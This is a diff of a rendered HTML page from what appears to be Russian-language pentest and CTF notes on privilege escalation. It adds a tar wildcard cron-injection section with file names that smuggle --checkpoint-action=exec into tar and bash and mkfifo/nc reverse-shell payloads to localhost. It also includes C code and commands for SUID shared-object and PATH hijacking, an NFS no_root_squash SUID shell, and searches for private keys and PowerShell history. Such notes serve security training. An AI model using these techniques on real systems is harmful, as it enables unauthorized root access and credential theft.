@@ -946,6 +946,19 @@
     Некорректная конфигурация cronjobs
   </a>
   
+    <nav class="md-nav" aria-label="Некорректная конфигурация cronjobs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cronjobs-tar" class="md-nav__link">
+    cronjobs и tar *
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -1621,6 +1634,8 @@
         
           
         
+          
+        
       
       
         
@@ -1693,6 +1708,20 @@
     <li class="md-nav__item">
       <a href="../../../CTF/root_me/" class="md-nav__link">
         Root me
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../CTF/Skynet/" class="md-nav__link">
+        Skynet
       </a>
     </li>
   
@@ -2558,6 +2587,19 @@
     Некорректная конфигурация cronjobs
   </a>
   
+    <nav class="md-nav" aria-label="Некорректная конфигурация cronjobs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cronjobs-tar" class="md-nav__link">
+    cronjobs и tar *
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -2843,24 +2885,34 @@
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.10.10/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
 </span></code></pre></div>
 либо, все, что угодно, в зависимости от необходимости.</p>
+<h5 id="cronjobs-tar">cronjobs и tar *</h5>
 <p>Отдельный разговор про использование заданий с архиваторами которые запускаются с wildcard масками.
 К примеру у <code>tar</code> есть ключи (<code>--checkpoint</code>, <code>--checkpoint-action</code>) которые позволяют запустить произвольный бинарник, а так как наличие wildcard маски в скрипте, заставит его выполнить операцию над всеми файлами в указанном каталоге, эксплуатировать уязвимость не составит труда:</p>
 <p>Предположим, что в crontab tar вызывается из домашней директории следующим образом:
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>tar<span class="w"> </span>czf<span class="w"> </span>/tmp/backup.tar.gz
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">cd</span><span class="w"> </span>~
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>tar<span class="w"> </span>czf<span class="w"> </span>/tmp/backup.tar.gz<span class="w"> </span>*
 </span></code></pre></div>
 тогда для запуска payload:</p>
 <p>cоздадим payload <code>local_sh.sh</code> который запустит сеанс <code>sh</code> на локальном порту 4444:</p>
-<div class="language-Bash highlight"><span class="filename">local_sh.sh</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;#!/bin/sh\nbash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>local_sh.sh
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>local_sh.sh
+<p><div class="language-Bash highlight"><span class="filename">local_sh.sh</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1">#Находясь в директории файлы из которой обрабатывает tar</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;#!/bin/sh\n/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>local_sh.sh
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>local_sh.sh
 </span></code></pre></div>
+или
+<div class="language-Bash highlight"><span class="filename">fifo_shell.sh</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">#Находясь в директории файлы из которой обрабатывает tar</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>fifo_shell.sh
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>fifo_shell.sh
+</span></code></pre></div></p>
 <p>создадим файлы которые <code>tar</code> обработает как ключи в команде:</p>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>touch<span class="w"> </span>~/--checkpoint<span class="o">=</span><span class="m">1</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>touch<span class="w"> </span>~/--checkpoint-action<span class="o">=</span>local_sh.sh
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1">#Находясь в директории файлы из которой обрабатывает tar</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>touch<span class="w"> </span><span class="s2">&quot;./--checkpoint=1&quot;</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>touch<span class="w"> </span><span class="s2">&quot;~/--checkpoint-action=exec=sh local_sh.sh[fifo_shell.sh]&quot;</span>
 </span></code></pre></div>
 <p>останется запустить <code>nc -lvnp 4444</code> и ждать выполнения задачи, а с ней и открытия root shell</p>
+<p>Подробное объяснение такой атаки <a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">здесь</a></p>
 <h4 id="suid-sgid">Некорректная раздача SUID SGID прав.</h4>
 <p>Оказавшись на целевой машине, хорошим делом будет поискать  в системе бинарники с SUID, SGID правами (пример для Debian based машин): 
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-a<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-perm<span class="w"> </span>-u+s<span class="w"> </span>-o<span class="w"> </span>-perm<span class="w"> </span>-g+s<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-a<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-perm<span class="w"> </span>-u+s<span class="w"> </span>-o<span class="w"> </span>-perm<span class="w"> </span>-g+s<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
 </span></code></pre></div>
 далее, возможны следующие шаги: </p>
 <ol>
@@ -2872,16 +2924,16 @@
 </li>
 <li>
 <p>если бинарник с SUID/GUID правами использует в своей работе <a href="https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">shared objects</a> которые принадлежат локальному пользователю, можно подменить такие библиотеки на payload который выполнит нужное действие. Найти используемые библиотеки бинарника можно через <code>strace</code>. Подходящий (имеющий rw права) объект можно подменить, к примеру, на такой код:
-<div class="language-C highlight"><span class="filename">payload.c</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="n">attribute</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="p">}</span>
+<div class="language-C highlight"><span class="filename">payload.c</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="n">attribute</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="p">}</span>
 </span></code></pre></div>
 далее код компилируется и помещается в директорию с shared object-ом:
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>/path/to/shared/lib/shared_lib.so<span class="w"> </span>~/payload.c
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>/path/to/shared/lib/shared_lib.so<span class="w"> </span>~/payload.c
 </span></code></pre></div>
 после чего запускаем бинарник -&gt; получаем root shell</p>
 </li>
@@ -2890,16 +2942,16 @@
 Использование <code>strings</code> может быть полезно для получения информации о вызовах сторонних приложений:
 <img alt="" src="/images/strings.jpg" /><br />
 в процессе работы, бинарник с SUID правами suid-env вызывает некий <code>service</code>. Он вызывается без абсолютного пути, следовательно его можно подменить:
-<div class="language-C highlight"><span class="filename">service.c</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="p">}</span>
+<div class="language-C highlight"><span class="filename">service.c</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="p">}</span>
 </span></code></pre></div>
 компилируем:
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>gcc<span class="w"> </span>-o<span class="w"> </span>service<span class="w"> </span>~/service.c
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>gcc<span class="w"> </span>-o<span class="w"> </span>service<span class="w"> </span>~/service.c
 </span></code></pre></div>
 Добавляем в PATH текущий путь и открываем бинарник:
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span><span class="w"> </span>/usr/local/bin/suid-env
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span><span class="w"> </span>/usr/local/bin/suid-env
 </span></code></pre></div></p>
 </li>
 </ol>
@@ -2907,13 +2959,13 @@
 <p>Отдельно следует упомянуть <a href="http://man.he.net/?topic=capabilities&amp;section=all">capabilities</a> - возможность более гранулярной раздачи прав на файлы в отличии от привычной модели основанной на привилегированном/непривилегированном пользователе.</p>
 <p>В части касающейся эскалации привилегий, будут интересны те бинарники у которых выставлен capability флаг <strong>CAP_SETUID</strong> который представляет из себя фактически SUID бит, однако не отображается как таковой через тот же <code>ls</code>.</p>
 <p>Для поиска бинарников с установленными capabilities флагами можно воспользоваться следующей командой:
-<div class="language-Bash highlight"><span class="filename">Поиск бинарников с capability флагами</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
+<div class="language-Bash highlight"><span class="filename">Поиск бинарников с capability флагами</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
 </span></code></pre></div></p>
 <p>далее, по аналогии с SUID/SGID - идём на  <a href="https://gtfobins.github.io/">GTFOBins</a>, а дальше понятно.</p>
 <h4 id="history-config">Исследование history, config и прочих файлов.</h4>
 <p>Исследований истории введенных команд и различных конфигурационных файлов может быть полезно, порой там можно найти ценную информацию включая credentials. </p>
 <p>Также имеют место быть случаи, когда беспечные пользователи могут сбэкапить private keys в директории с некорреткными правами, следовательно полезно поискать файлы ключей в системе, например так:
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>find<span class="w"> </span>/.ssh<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span>PRIVATE<span class="w"> </span><span class="s1">&#39;{}&#39;</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span>-print<span class="w">  </span><span class="m">2</span>&gt;/dev/null
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>find<span class="w"> </span>/.ssh<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span>PRIVATE<span class="w"> </span><span class="s1">&#39;{}&#39;</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span>-print<span class="w">  </span><span class="m">2</span>&gt;/dev/null
 </span></code></pre></div></p>
 <h4 id="nfs-no_root_squash">NFS и no_root_squash</h4>
 <p>В NFS шарах по умолчанию у файлов которые загружают пользователи из под root, автоматически меняется владелец на nfsnobody.
@@ -2923,20 +2975,20 @@
 </blockquote>
 <p>Можно на своей машине создать payload в <code>msfvenom</code> или просто скопировать <code>/bin/sh</code> на который установить SUID права (<code>chmod +xs</code>), а потом залить его на шару, однако такой метод не всегда будет работать из-за возможного несоответсвия библиотек на машинах. </p>
 <p>Считаю, что оптимальным вариантом является использование бинарника который запускает shell. :</p>
-<p><div class="language-C highlight"><span class="filename">s_bash.c</span><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cm">/* находимся в шаре с директивой no_root_squash </span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cm">под root*/</span>
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="p">{</span>
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">);</span>
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="p">}</span>
+<p><div class="language-C highlight"><span class="filename">s_bash.c</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cm">/* находимся в шаре с директивой no_root_squash </span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="cm">под root*/</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="p">{</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">);</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="p">}</span>
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># находимся в шаре с директивой no_root_squash</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="c1"># под root</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>gcc<span class="w"> </span>s_bash.c<span class="w"> </span>-o<span class="w"> </span>suid-bash<span class="w"> </span>-w
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>chmod<span class="w"> </span>+s<span class="w"> </span>suid-bash
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># находимся в шаре с директивой no_root_squash</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="c1"># под root</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>gcc<span class="w"> </span>s_bash.c<span class="w"> </span>-o<span class="w"> </span>suid-bash<span class="w"> </span>-w
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>chmod<span class="w"> </span>+s<span class="w"> </span>suid-bash
 </span></code></pre></div></p>
 <h4 id="kernel-exploits">Kernel Exploits</h4>
 <p>Есть смысл проверить существуют ли известные уязвимости для текущей версии ядра. Это можно сделать как в ручную, через <code>uname -r</code> с дальнейшим гуглением или поиском на exploit-DB, так и через удобный скрипт на perl - <a href="https://github.com/jondonas/linux-exploit-suggester-2">Linux-exploit-suggester2</a></p>
@@ -2971,9 +3023,9 @@
 </ul>
 <h4 id="powershell">История Powershell</h4>
 <p>Не менее полезным является изучение ввода Powershell:</p>
-<div class="language-text highlight"><span class="filename">CMD</span><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+<div class="language-text highlight"><span class="filename">CMD</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 </span></code></pre></div>
-<div class="language-text highlight"><span class="filename">Powershell</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+<div class="language-text highlight"><span class="filename">Powershell</span><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 </span></code></pre></div>
 <h4 id="powershell_1">История Powershell</h4>
 <hr />
